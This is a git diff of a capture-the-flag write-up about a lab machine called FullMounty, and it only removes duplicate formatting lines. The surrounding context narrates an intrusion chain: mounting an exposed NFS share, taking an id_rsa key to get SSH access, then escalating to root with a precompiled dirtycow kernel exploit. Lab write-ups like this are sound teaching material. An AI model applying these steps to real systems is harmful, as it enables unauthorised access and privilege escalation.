@@ -49,7 +49,6 @@ PORT      STATE SERVICE  VERSION
 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 ```
 {: .nolineno}
-{: .nolineno}
 
 ## NFS Shares Enumeration ⤵️
 
@@ -61,7 +60,6 @@ Now I have access to nfs so lets see its shared shares through `showmount` comma
 Export list for 10.150.150.134:
 /srv/exportnfs 10.0.0.0/8
 ```
-{: .nolineno}
 {: .nolineno}
 
 Now lets mount this directory in out local system through `mount` command ⤵️ 
@@ -80,7 +78,6 @@ mount.nfs: trying 10.150.150.134 prog 100003 vers 3 prot TCP port 2049
 mount.nfs: prog 100005, trying vers=3, prot=6
 mount.nfs: trying 10.150.150.134 prog 100005 vers 3 prot TCP port 34154
 ```
-{: .nolineno}
 {: .nolineno}
 
 Now lets check if it gets mounted or not with `df` command →
@@ -111,7 +108,6 @@ drwxr-xr-x  3 nobody nogroup 4096 Oct 29  2019 .mozilla
 41b779ac4c999468ba7f862cde86412096d1c37b
 ```
 {: .nolineno}
-{: .nolineno}
 
 Now I got the id_rsa private key so lets try to SSH into the system →
 
@@ -134,7 +130,6 @@ uid=1000(deadbeef) gid=1000(deadbeef) groups=4(adm),20(dialout),24(cdrom),46(plu
 deadbeef@FullMounty:~$
 ```
 {: .nolineno}
-{: .nolineno}
 
 Now lets dig deeper into the shell for root access , and for that I directly checked the kernel version so I got this →
 
@@ -143,7 +138,6 @@ deadbeef@FullMounty:/$ uname -an
 Linux FullMounty 2.6.32-21-generic #32-Ubuntu SMP Fri Apr 16 08:10:02 UTC 2010 i686 GNU/Linux
 deadbeef@FullMounty:/$
 ```
-{: .nolineno}
 {: .nolineno}
 
 Since it is very old Linux machine so lets use the exploit named as dirtycow over here I have the pre-compiled file of it for both architecture of machine x32 and x64 so lets use  x32 over here ⤵️ 
@@ -202,7 +196,6 @@ drwxr-xr-x  2 evait root 4096 2019-10-03 00:10 .debtags
 -rw-r--r--  1 evait root  140 2010-04-23 02:45 .profile
 evait@FullMounty:~#
 ```
-{: .nolineno}
 {: .nolineno}
 
 Now I am root !!
